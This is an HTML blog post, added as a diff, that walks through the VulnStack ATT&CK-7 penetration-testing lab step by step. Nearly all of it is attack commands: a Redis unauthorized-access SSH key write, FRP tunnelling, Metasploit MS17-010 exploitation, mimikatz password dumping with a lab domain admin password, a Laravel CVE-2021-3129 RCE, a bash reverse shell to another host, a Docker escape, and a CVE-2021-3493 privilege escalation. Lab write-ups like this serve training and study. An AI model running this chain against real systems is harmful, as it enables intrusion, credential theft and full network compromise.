@@ -1,0 +1,159 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="VulnStack-ATT&amp;CK-7"><meta name="keywords" content=""><meta name="author" content="山野人"><meta name="copyright" content="山野人"><title>VulnStack-ATT&amp;CK-7 | 山野人</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  hexoVersion: '7.1.1'
+} </script><meta name="generator" content="Hexo 7.1.1"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B8%97%E9%80%8F"><span class="toc-number">1.</span> <span class="toc-text">服务器渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEredis"><span class="toc-number">1.2.</span> <span class="toc-text">未授权访问redis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83GetShell"><span class="toc-number">1.3.</span> <span class="toc-text">未授权GetShell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">第一层内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-number">2.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FRP%E5%BC%80%E4%BB%A3%E7%90%86"><span class="toc-number">2.2.</span> <span class="toc-text">FRP开代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.3.</span> <span class="toc-text">nmap信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D"><span class="toc-number">2.4.</span> <span class="toc-text">永恒之蓝</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">第二层内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#KSCAN%E6%89%AB%E6%8F%8F"><span class="toc-number">3.1.</span> <span class="toc-text">KSCAN扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FRP%E4%BB%A3%E7%90%86"><span class="toc-number">3.2.</span> <span class="toc-text">FRP代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5DC"><span class="toc-number">3.3.</span> <span class="toc-text">连接DC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BD%99%E4%B8%BB%E6%9C%BA%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">其余主机渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WIN7"><span class="toc-number">4.1.</span> <span class="toc-text">WIN7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ubuntu"><span class="toc-number">4.2.</span> <span class="toc-text">Ubuntu</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2"><span class="toc-number">4.2.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GetShell"><span class="toc-number">4.2.2.</span> <span class="toc-text">GetShell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Docker%E9%80%83%E9%80%B8"><span class="toc-number">4.2.3.</span> <span class="toc-text">Docker逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.2.4.</span> <span class="toc-text">权限提升</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">相关链接</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">山野人</div><div class="author-info__description text-center">日落山水静 为君起松声</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">11</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">山野人</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">VulnStack-ATT&amp;CK-7</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2024-09-25</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="服务器渗透"><a href="#服务器渗透" class="headerlink" title="服务器渗透"></a>服务器渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sV -n -v 192.168.3.0/24</span><br></pre></td></tr></table></figure>
+
+<p>发现192.168.3.7</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -n -v -p 1-65535 192.168.3.7</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240925113831260.png" alt="image-20240925113831260"></p>
+<h3 id="未授权访问redis"><a href="#未授权访问redis" class="headerlink" title="未授权访问redis"></a>未授权访问redis</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.3.7</span><br></pre></td></tr></table></figure>
+
+<h3 id="未授权GetShell"><a href="#未授权GetShell" class="headerlink" title="未授权GetShell"></a>未授权GetShell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#生成公钥</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">#将公钥导入1.txt文件</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; 1.txt </span><br><span class="line">#把1.txt文件内容写入目标主机的redis缓冲中</span><br><span class="line">cat 1.txt | redis-cli -h 192.168.43.229 -p 6379 -x set hello</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh                #设置redis的备份路径为/root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys    #设置保存文件名为authorized_keys</span><br><span class="line">save                                     #将数据保存在目标服务器硬盘上</span><br><span class="line">ssh 192.168.43.229                       #连接                    </span><br></pre></td></tr></table></figure>
+
+<p>得到的是root权限</p>
+<h2 id="第一层内网渗透"><a href="#第一层内网渗透" class="headerlink" title="第一层内网渗透"></a>第一层内网渗透</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240925114436929.png" alt="image-20240925114436929"></p>
+<p>第二张网卡192.168.52.10，判断在内网中，执行下面命令扫描内网存活主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for k in $(seq 1 254); do ping -c 1 192.168.52.$k | grep &quot;ttl&quot; | awk -F&#x27;[ :]+&#x27; &#x27;&#123;print $4&#125;&#x27;; done</span><br></pre></td></tr></table></figure>
+
+<p>发现该内外中存在192.168.52.20，192.168.52.30</p>
+<h3 id="FRP开代理"><a href="#FRP开代理" class="headerlink" title="FRP开代理"></a>FRP开代理</h3><p>kali</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nohup ./frps -c frps.ini &amp;</span><br><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure>
+
+<p>ubuntu</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.3.3:8080/frpc</span><br><span class="line">wget http://192.168.3.3:8080/frpc.ini</span><br><span class="line">chmod +x frpc</span><br><span class="line">nohup ./frpc -c frpc.ini &amp;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="nmap信息收集"><a href="#nmap信息收集" class="headerlink" title="nmap信息收集"></a>nmap信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p -n 192.168.52.20</span><br><span class="line">nmap -sV -p -n 192.168.52.30</span><br></pre></td></tr></table></figure>
+
+<p>192.168.52.20开启了22、8000等端口，为Linux系统</p>
+<p>192.168.52.30开启了445、8080等端口，为Windows系统</p>
+<h3 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">setg Proxies socks5:192.168.3.3:6005</span><br><span class="line">search ms17_010</span><br><span class="line">use 0</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set autorunscript post/windows/manage/migrate</span><br><span class="line">set rhosts 192.168.52.30</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240925120548607.png" alt="image-20240925120548607"></p>
+<p>查一下网卡信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell ipconfig</span><br></pre></td></tr></table></figure>
+
+<p>发现还存在192.168.93.20</p>
+<h2 id="第二层内网渗透"><a href="#第二层内网渗透" class="headerlink" title="第二层内网渗透"></a>第二层内网渗透</h2><h3 id="KSCAN扫描"><a href="#KSCAN扫描" class="headerlink" title="KSCAN扫描"></a>KSCAN扫描</h3><p>上传kscan后进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kscan_windows_amd64.exe -t 192.168.93.0/24</span><br></pre></td></tr></table></figure>
+
+<p>发现存活192.168.93.10(linux)、192.168.93.20(win)、192.168.93.30(win)、192.168.93.40(win)</p>
+<p><img src="/pic/image-20240925134249581-1727242973749-1.png" alt="image-20240925134249581"></p>
+<p>30、40都开放445，可以尝试永恒之蓝攻击，攻击前我们先使用frp搭建隧道进第二次内网也就是192.168.93.0网段</p>
+<p>看看域控DC是哪个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping whoamianony.org</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240925134702381.png" alt="image-20240925134702381"></p>
+<p>抓一下明文密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">upload ~/tq/mimikatz/x64/mimikatz.exe</span><br><span class="line">shell</span><br><span class="line">mimikatz.exe</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240925135812875.png" alt="image-20240925135812875"></p>
+<p>发现域控管理明文密码，下面就是开代理链接域控DC</p>
+<h3 id="FRP代理"><a href="#FRP代理" class="headerlink" title="FRP代理"></a>FRP代理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># frps2.ini  kali</span><br><span class="line"></span><br><span class="line">echo &#x27;[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7788&#x27; &gt;frps2.ini</span><br><span class="line"></span><br><span class="line">nohup ./frps -c frps2.ini &amp;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># frps3.ini Net1 PC ubuntu</span><br><span class="line"></span><br><span class="line">echo &#x27;[common]</span><br><span class="line">bind_addr = 192.168.52.10</span><br><span class="line">bind_port = 7799&#x27; &gt; frps3.ini</span><br><span class="line"></span><br><span class="line">nohup ./frps -c frps3.ini &amp;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># frpc2.ini Net1 PC ubuntu</span><br><span class="line"></span><br><span class="line">echo &#x27;[common]</span><br><span class="line">server_addr = 192.168.3.3</span><br><span class="line">server_port = 7788</span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 192.168.52.10</span><br><span class="line">local_port = 1080</span><br><span class="line">remote_port = 1080&#x27; &gt; frpc2.ini</span><br><span class="line"></span><br><span class="line">nohup ./frpc -c frpc2.ini &amp;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># frpc3.ini Net2 PC windows</span><br><span class="line">echo &#x27;[common]</span><br><span class="line">server_addr = 192.168.52.10</span><br><span class="line">server_port = 7799</span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 1080</span><br><span class="line">plugin = socks5&#x27; &gt; frpc3.ini</span><br><span class="line"></span><br><span class="line">frpc.exe -c frpc3.ini</span><br></pre></td></tr></table></figure>
+
+<p>到目前为止，1080端口是第二层网络代理，也就是可以访问192.168.93.0&#x2F;24，6005端口是第一层，访问192.168.52.0&#x2F;24</p>
+<h3 id="连接DC"><a href="#连接DC" class="headerlink" title="连接DC"></a>连接DC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec-pro.py &#x27;Administrator:Whoami2021@192.168.93.30&#x27; exec-command -shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240925140123180.png" alt="image-20240925140123180"></p>
+<h2 id="其余主机渗透"><a href="#其余主机渗透" class="headerlink" title="其余主机渗透"></a>其余主机渗透</h2><h3 id="WIN7"><a href="#WIN7" class="headerlink" title="WIN7"></a>WIN7</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">setg Proxies socks5:192.168.3.3:1080</span><br><span class="line">search ms17_010</span><br><span class="line">use 0</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set autorunscript post/windows/manage/migrate</span><br><span class="line">set rhosts 192.168.93.40</span><br><span class="line">set lport 4466</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240925134959090.png" alt="image-20240925134959090"></p>
+<p>除上面的主机外，第一层网络还存在一个ubuntu192.168.52.20没GetShell</p>
+<h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><h4 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sV -n -v 192.168.52.20</span><br></pre></td></tr></table></figure>
+
+<p>发现8000端口开着，挂代理访问发现是laravel，这个界面和我们直接访问192.168.3.7:81是一样的，说明192.168.3.7在做反代，这里我们对192.168.3.7:81进行渗透测试</p>
+<h4 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h4><p>可以参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ArcherCY/p/17735493.html">laravel RCE（cve-2021-3129）复现 - Running_J - 博客园 (cnblogs.com)</a></p>
+<p>使用下面数据包验证CVE-2021-3129</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: 192.168.3.7:81</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 168</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">&quot;parameters&quot;: &#123;</span><br><span class="line">&quot;variableName&quot;: &quot;jack&quot;,</span><br><span class="line">&quot;viewFile&quot;: &quot;jack1&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240925142053105.png" alt="image-20240925142053105"></p>
+<p>漏洞存在，使用<a target="_blank" rel="noopener" href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 laravel-CVE-2021-3129-EXP.py http://192.168.3.7:81</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240925142833882.png" alt="image-20240925142833882"></p>
+<p>接着使用哥斯拉2连接</p>
+<p><img src="/pic/image-20240925143108056.png" alt="image-20240925143108056"></p>
+<p>为docker环境，我的这里什么都执行不了，注意这个终端是192.168.52.20的，我们将它反弹回192.168.52.10</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.52.10/65432 &lt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240925143628431.png" alt="image-20240925143628431"></p>
+<p>查找高权限文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>发现&#x2F;home&#x2F;jobs&#x2F;shell</p>
+<p><img src="/pic/image-20240925143828249.png" alt="image-20240925143828249"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/jobs</span><br><span class="line">./shell</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h4><p>192.168.52.20</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /</span><br><span class="line">mkdir hello</span><br><span class="line">mount /dev/sda1 /hello</span><br><span class="line">ls /hello</span><br></pre></td></tr></table></figure>
+
+<p>192.168.52.10</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f hack</span><br><span class="line">chmod 600 hack</span><br></pre></td></tr></table></figure>
+
+<p>192.168.52.20</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp -avx /hack/home/ubuntu/.ssh/id_rsa.pub /hack/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDH0Pj+AghZo27EjM48eai0FNI/AiJExG6QISl315grBY4yRXlwb1mo6sUnHPRfkUs1XIJq/Ogc1FxFGr3S8VypKMD7cGOsBuGjALgfiXXEGyh4yzuWKG7O+OgAAfEHb4/LwiG8fWcixl14NCxEP7SozIdPhkI17JcFTAy70RmxdoYNJsD+Qa0b4m2gX7kiB5fVrnF266JQwDjpXOSoL8BrAMoTBuJk947OGSlVyZVD40TllLP6q4odylnZ3KS4CUv8p2z8hZoS+W6yUGZoeB6LzS2udqQ1/DDX1qGFH2llra57XCREuoykixGIwXw4HeVTcTPxTa4Ampy3pDHkfKmh root@ubuntu&#x27; &gt; /hack/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">cat /hack/home/ubuntu/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>192.168.52.20</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i hack ubuntu@192.168.52.20</span><br></pre></td></tr></table></figure>
+
+<h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240925153721776.png" alt="image-20240925153721776"></p>
+<p>存在CVE-2021-3493</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/briskets/CVE-2021-3493">briskets&#x2F;CVE-2021-3493: Ubuntu OverlayFS Local Privesc (github.com)</a></p>
+<p>先下载到192.168.52.10，再从192.168.52.10下载到192.168.52.20，下载好后执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc exploit.c -o exploit</span><br><span class="line">./exploit</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240925155329340.png" alt="image-20240925155329340"></p>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>mimikatz使用：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/n3w1492/p/13734279.html#:~:text=msf%E4%B8%AD%E7%9A%84mimik">https://www.cnblogs.com/n3w1492/p/13734279.html#:~:text=msf%E4%B8%AD%E7%9A%84mimik</a></p>
+<p>frp多层隧道：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ss810540895/article/details/124987061#:~:text=%E2%BC%80%E8%88%AC%E5%B8%B8%E2%BB%85%E7%9A%84%E5%86%85%E2%BD%B9%E5%8F%AA%E6%9C%89%E2%BC%80">利用Frp建立多层代理_frp多级代理-CSDN博客</a></p>
+<p>CVE-2021-3129利用：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ArcherCY/p/17735493.html">laravel RCE（cve-2021-3129）复现 - Running_J - 博客园 (cnblogs.com)</a></p>
+<p>CVE-2021-3493利用：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/briskets/CVE-2021-3493">briskets&#x2F;CVE-2021-3493: Ubuntu OverlayFS Local Privesc (github.com)</a></p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">山野人</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://lxy00.top/2024/09/25/VulnStack-ATT&amp;CK-7/">http://lxy00.top/2024/09/25/VulnStack-ATT&amp;CK-7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://lxy00.top">山野人</a>！</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="next-post pull-right"><a href="/2024/09/21/VulnStack-ATT&amp;CK-5/"><span>VulnStack-ATT&amp;CK-5</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'false' == 'true';
+var verify = 'false' == 'true';
+var record_ip = 'false' == 'true';
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  recordIP:record_ip,
+  appId:'Bnr1wLZ3jY69sAXABKBTt5TO-gzGzoHsz',
+  appKey:'loLNR3sesNkuhCMjtzlb2g1d',
+  placeholder:'请你不要 diss 我',
+  avatar:'monsterid',
+  guest_info:guest_info,
+  pageSize:'10',
+  lang: 'zh-cn'
+})</script></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2022 - 2024 By 山野人</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://github.com/Yllxx03">Github</a>!</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script 